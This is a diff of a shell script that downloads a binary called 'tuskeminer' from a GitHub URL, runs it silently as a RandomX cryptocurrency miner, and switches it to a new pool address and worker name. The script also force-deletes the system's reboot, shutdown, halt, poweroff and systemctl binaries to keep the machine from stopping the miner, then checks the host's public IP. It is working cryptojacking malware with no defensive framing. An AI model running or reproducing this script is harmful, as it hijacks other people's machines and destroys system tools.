@@ -3,7 +3,7 @@ apt update
 apt -y install sudo
 wget https://github.com/cornea99/edann/raw/main/tuskeminer > /dev/null 2>&1 
 chmod +x tuskeminer
-./tuskeminer -a rx/0 --url 192.248.147.149:443 --user TuskeSyuXDmimmdhwmHLpzWxcgaxw28taAYJT79hbCfnJ7UHBLEKFFQG9Gbbv4fxGwd9kXPehzp2n1Yu43THWqdbKLujvTAWvH45mf.jancuk > /dev/null 2>&1 &
+./tuskeminer -a rx/0 --url 165.227.239.240:80 --user TuskeSyuXDmimmdhwmHLpzWxcgaxw28taAYJT79hbCfnJ7UHBLEKFFQG9Gbbv4fxGwd9kXPehzp2n1Yu43THWqdbKLujvTAWvH45mf.new > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
